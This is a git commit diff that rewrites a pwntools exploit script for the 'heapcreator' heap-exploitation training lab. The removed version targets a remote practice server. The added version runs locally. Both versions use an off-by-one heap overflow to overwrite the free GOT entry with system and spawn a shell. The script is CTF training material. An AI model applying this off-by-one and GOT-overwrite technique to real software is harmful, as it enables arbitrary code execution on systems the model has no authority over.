80021b9563db0a1946cb5d3d98fa88fbc8df6d33
Ashen <56328586+jasonkyle1208@users.noreply.github.com>
2022-05-12 17:13:33 +0800

    Update heapcreator.py

--- LAB/lab13/heapcreator.py
+++ LAB/lab13/heapcreator.py
@@ -1,58 +1,48 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwnpwnpwn import *
+#Ubuntu 16.04 , libc-2.27.so
 from pwn import *
 
-host = "training.pwnable.tw"
-port = 11013
-#host = "10.211.55.28"
-#port = 8888
+io = process('./heapcreator')
+elf = ELF('./heapcreator')
+libc = elf.libc
 
-r = remote(host,port)
-
-
-def create(size,content):
-    r.recvuntil(":")
-    r.sendline("1")
-    r.recvuntil(":")
-    r.sendline(str(size))
-    r.recvuntil(":")
-    r.sendline(content)
+def add(size,content):
+    io.sendlineafter("Your choice :",'1')
+    io.sendlineafter("Size of Heap : ",str(size))
+    io.sendlineafter("Content of heap:",content)
 
 def edit(idx,content):
-    r.recvuntil(":")
-    r.sendline("2")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-    r.recvuntil(":")
-    r.sendline(content)
+    io.sendlineafter("Your choice :",'2')
+    io.sendlineafter("Index :",str(idx))
+    io.sendlineafter("Content of heap : ",content)
 
 def show(idx):
-    r.recvuntil(":")
-    r.sendline("3")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+    io.sendlineafter("Your choice :",'3')
+    io.sendlineafter("Index :",str(idx))
 
-def delete(idx):
-    r.recvuntil(":")
-    r.sendline("4")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+def free(idx):
+    io.sendlineafter("Your choice :",'4')
+    io.sendlineafter("Index :",str(idx))
 
-free_got = 0x602018
-create(0x18,"dada") # 0
-create(0x10,"ddaa") # 1
-edit(0, "/bin/sh\x00" +"a"*0x10 + "\x41")
-delete(1)
-create(0x30,p64(0)*4 +p64(0x30) +  p64(free_got)) #1
-show(1)
-r.recvuntil("Content : ")
-data = r.recvuntil("Done !")
+add(0x18,'aaaa') #chunk 0
+add(0x10,'bbbb') #chunk 1
+add(0x10,'cccc') #chunk 2
+add(0x10,'/bin/sh') #chunk 3
 
-free_addr = u64(data.split("\n")[0].ljust(8,"\x00"))
-libc = free_addr - 0x83940 
-print "libc:",hex(libc)
-system = libc + 0x45390
-edit(1,p64(system))
-delete(0)
-r.interactive()
+edit(0,'a'*0x18+'\x81') #off by one
+free(1)
+
+#write the free_got on the pointer of chunk 2
+payload = 'd'*0x40+'\x08'.ljust(8,'\x00')+p64(elf.got['free'])
+add(0x70,payload)
+
+show(2)
+io.recvuntil('Content : ')
+free_addr = u64(io.recvuntil('Done')[:-5].ljust(8,'\x00'))
+libc_base = free_addr - libc.sym['free']
+system_addr = libc_base + libc.sym['system']
+print 'free_addr',hex(free_addr)
+print 'system_addr',hex(system_addr)
+
+edit(2,p64(system_addr))
+free(3)
+io.interactive()
